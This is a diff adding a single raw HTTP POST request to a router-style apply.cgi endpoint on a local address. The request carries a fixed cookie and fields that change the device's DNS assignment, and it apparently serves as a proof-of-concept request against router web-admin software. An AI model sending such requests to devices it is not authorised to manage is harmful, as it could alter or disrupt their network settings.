@@ -1,0 +1,7 @@
+POST /apply.cgi?c HTTP/1.1
+HOST: 192.168.0.50
+Cookie: uid=xhyxhy
+Content-Type: xml/text
+Content-Length: 27
+
+submit_flag=bpa&DNSAssign=6
